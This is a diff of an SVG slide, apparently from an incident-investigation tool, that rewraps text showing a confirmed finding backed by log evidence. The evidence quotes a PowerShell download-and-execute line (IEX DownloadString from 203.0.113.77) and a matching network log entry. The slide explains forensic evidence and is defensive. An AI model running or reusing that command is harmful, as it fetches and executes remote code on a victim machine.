@@ -24,19 +24,22 @@
   <g>
     <rect x="92" y="390" width="560" height="138" rx="18" fill="#111b23" stroke="#75d38a" stroke-width="2" filter="url(#shadow)"/>
     <text x="122" y="438" font-family="Menlo, Consolas, monospace" font-size="26" font-weight="800" fill="#75d38a">CLAIM-009 · CONFIRMED</text>
-    <text x="122" y="482" font-family="Inter, Helvetica, Arial, sans-serif" font-size="23" fill="#eff8f7">PowerShell downloaded attacker script</text>
+    <text x="122" y="478" font-family="Inter, Helvetica, Arial, sans-serif" font-size="21" font-weight="500" fill="#eff8f7">PowerShell downloaded attacker</text>
+<text x="122" y="502.36" font-family="Inter, Helvetica, Arial, sans-serif" font-size="21" font-weight="500" fill="#eff8f7">script</text>
   </g>
       
   <g>
     <rect x="92" y="568" width="560" height="138" rx="18" fill="#111b23" stroke="#45d4c8" stroke-width="2" filter="url(#shadow)"/>
     <text x="122" y="616" font-family="Menlo, Consolas, monospace" font-size="26" font-weight="800" fill="#45d4c8">EVIDENCE A · powershell.log:2</text>
-    <text x="122" y="660" font-family="Inter, Helvetica, Arial, sans-serif" font-size="23" fill="#eff8f7">IEX DownloadString('http://203.0.113.77/a.ps1')</text>
+    <text x="122" y="656" font-family="Inter, Helvetica, Arial, sans-serif" font-size="21" font-weight="500" fill="#eff8f7">IEX</text>
+<text x="122" y="680.36" font-family="Inter, Helvetica, Arial, sans-serif" font-size="21" font-weight="500" fill="#eff8f7">DownloadString('http://203.0.113.77/a.ps1')</text>
   </g>
       
   <g>
     <rect x="92" y="746" width="560" height="138" rx="18" fill="#111b23" stroke="#45d4c8" stroke-width="2" filter="url(#shadow)"/>
     <text x="122" y="794" font-family="Menlo, Consolas, monospace" font-size="26" font-weight="800" fill="#45d4c8">EVIDENCE B · network.log:1</text>
-    <text x="122" y="838" font-family="Inter, Helvetica, Arial, sans-serif" font-size="23" fill="#eff8f7">powershell.exe -&gt; 203.0.113.77 /a.ps1</text>
+    <text x="122" y="834" font-family="Inter, Helvetica, Arial, sans-serif" font-size="21" font-weight="500" fill="#eff8f7">powershell.exe -&gt; 203.0.113.77</text>
+<text x="122" y="858.36" font-family="Inter, Helvetica, Arial, sans-serif" font-size="21" font-weight="500" fill="#eff8f7">/a.ps1</text>
   </g>
       <rect x="830" y="390" width="860" height="494" rx="18" fill="#111b23" stroke="#2e4350" stroke-width="2" filter="url(#shadow)"/>
       <text x="878" y="462" font-family="Inter, Helvetica, Arial, sans-serif" font-size="34" font-weight="850" fill="#eff8f7">Receipt fields judges can inspect</text>
@@ -48,8 +51,7 @@
 <text x="878" y="750" font-family="Menlo, Consolas, monospace" font-size="27" fill="#a9bdc2">verifier: cross-supported</text>
   
   <g>
-    <rect x="78" y="938" width="1764" height="100" rx="16" fill="#050c12" opacity="0.78" stroke="#2e4350" stroke-width="2"/>
-    <text x="112" y="982" font-family="Inter, Helvetica, Arial, sans-serif" font-size="27" font-weight="750" fill="#eff8f7">Receipts bind findings to files, lines, hashes, and tool</text>
-<text x="112" y="1012.24" font-family="Inter, Helvetica, Arial, sans-serif" font-size="27" font-weight="750" fill="#eff8f7">calls.</text>
+    <rect x="96" y="930" width="1500" height="98" rx="16" fill="#050c12" opacity="0.82" stroke="#2e4350" stroke-width="2"/>
+    <text x="132" y="974" font-family="Inter, Helvetica, Arial, sans-serif" font-size="25" font-weight="750" fill="#eff8f7">Receipts point to files and tool calls.</text>
   </g>
 </svg>
